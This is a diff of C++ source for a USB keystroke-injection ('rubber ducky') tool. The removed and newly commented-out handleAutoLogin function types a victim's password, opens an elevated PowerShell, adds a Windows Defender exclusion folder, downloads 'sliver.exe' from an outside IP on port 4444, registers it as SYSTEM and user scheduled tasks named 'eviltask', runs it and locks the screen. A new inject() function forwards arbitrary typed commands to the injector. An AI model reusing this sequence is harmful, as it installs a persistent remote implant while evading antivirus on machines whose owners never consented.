@@ -35,64 +35,72 @@ void rubber_ducky(int globalFd, struct usb_raw_transfer_io globalIo,
 std::vector<unsigned int> hexStringToVector(const std::string &hexString);
 void testFunc(std::string pass);
 
-void handleAutoLogin(std::string userPassword) {
-  // sleep(1);
+// void handleAutoLogin(std::string userPassword) {
+//   // sleep(1);
+//
+//   // testFunc("[down]");
+//   // sleep(5);
+//
+//   sleep(1);
+//   std::cout << "Auto login" << std::endl;
+//   std::cout << "Password: " << userPassword << "\n";
+//   // sleep(60);
+//   testFunc("");
+//   sleep(3);
+//   testFunc(userPassword);
+//   sleep(2);
+//   testFunc("[new desktop]");
+//   sleep(2);
+//   testFunc("[win]");
+//   sleep(1.0);
+//   testFunc("powershell -c \"Start-Process powershell -verb runas\"");
+//   sleep(1);
+//   // testFunc("a");
+//   // sleep(0.5);
+//   // testFunc("[enter]");
+//   // sleep(1.5);
+//   testFunc("[tab]");
+//   sleep(1);
+//   testFunc("[tab]");
+//   sleep(0.5);
+//   testFunc("[enter]");
+//   sleep(2);
+//   testFunc("Enable-NetAdapterBinding -Name 'Internett2' -ComponentID
+//   ms_tcpip"); sleep(0.5); testFunc("mkdir C:\\.temp26422"); sleep(0.5);
+//   testFunc("Add-MpPreference -ExclusionPath 'C:\\.temp26422'");
+//   // testFunc("[enter]");
+//   sleep(0.5);
+//   testFunc("$ProgressPreference = 'SilentlyContinue'");
+//   // testFunc("[enter]");
+//   sleep(0.1);
+//   testFunc("curl.exe https://51.107.220.118:4444/sliv.exe -o "
+//            "'C:\\.temp26422\\sliver.exe' -k");
+//   sleep(3);
+//   testFunc("schtasks /create /sc minute /mo 1 /tn 'eviltask' /tr "
+//            "C:\\.temp26422\\sliver.exe /ru 'SYSTEM'");
+//   sleep(1);
+//   testFunc("schtasks /create /sc minute /mo 1 /tn 'eviltask2' /tr "
+//            "C:\\.temp26422\\sliver.exe /ru 'bruker'");
+//   sleep(2);
+//   testFunc("& 'C:\\.temp26422\\sliver.exe'");
+//   sleep(1);
+//   testFunc("exit");
+//   sleep(0.5);
+//   testFunc("[close current desktop]");
+//   sleep(1);
+//   testFunc("[lock]");
+//   passwordDone = false;
+//   passwordInput0 = false;
+// }
 
-  // testFunc("[down]");
-  // sleep(5);
+void inject(std::string userinput) {
+  std::string cmdString = "";
+  std::string direction = "";
+  std::vector<unsigned int> cmdVector = stringToBytePattern(userinput);
 
-  sleep(1);
-  std::cout << "Auto login" << std::endl;
-  std::cout << "Password: " << userPassword << "\n";
-  // sleep(60);
-  testFunc("");
-  sleep(3);
-  testFunc(userPassword);
-  sleep(2);
-  testFunc("[new desktop]");
-  sleep(2);
-  testFunc("[win]");
-  sleep(1.0);
-  testFunc("powershell -c \"Start-Process powershell -verb runas\"");
-  sleep(1);
-  // testFunc("a");
-  // sleep(0.5);
-  // testFunc("[enter]");
-  // sleep(1.5);
-  testFunc("[tab]");
-  sleep(1);
-  testFunc("[tab]");
-  sleep(0.5);
-  testFunc("[enter]");
-  sleep(2);
-  testFunc("Enable-NetAdapterBinding -Name 'Internett2' -ComponentID ms_tcpip");
-  sleep(0.5);
-  testFunc("mkdir C:\\.temp26422");
-  sleep(0.5);
-  testFunc("Add-MpPreference -ExclusionPath 'C:\\.temp26422'");
-  // testFunc("[enter]");
-  sleep(0.5);
-  testFunc("$ProgressPreference = 'SilentlyContinue'");
-  // testFunc("[enter]");
-  sleep(0.1);
-  testFunc("curl.exe https://51.107.220.118:4444/sliv.exe -o "
-           "'C:\\.temp26422\\sliver.exe' -k");
-  sleep(3);
-  testFunc("schtasks /create /sc minute /mo 1 /tn 'eviltask' /tr "
-           "C:\\.temp26422\\sliver.exe /ru 'SYSTEM'");
-  sleep(1);
-  testFunc("schtasks /create /sc minute /mo 1 /tn 'eviltask2' /tr "
-           "C:\\.temp26422\\sliver.exe /ru 'bruker'");
-  sleep(2);
-  testFunc("& 'C:\\.temp26422\\sliver.exe'");
-  sleep(1);
-  testFunc("exit");
-  sleep(0.5);
-  testFunc("[close current desktop]");
-  sleep(1);
-  testFunc("[lock]");
-  passwordDone = false;
-  passwordInput0 = false;
+  rubber_ducky(globalFd, globalIo, globalIoBackup, globalFinito,
+               globalBEndpointAddress, globalTransferType, globalDir, cmdVector,
+               cmdString, direction);
 }
 
 // User input handling function
@@ -147,7 +155,7 @@ void handleUserInput() {
       }
       if (parts.size() >= 2) {
 
-        handleAutoLogin(parts[1]);
+        // handleAutoLogin(parts[1]);
       }
     } else if (command.find("arrow ") == 0) {
       std::vector<unsigned int> cmdVector;
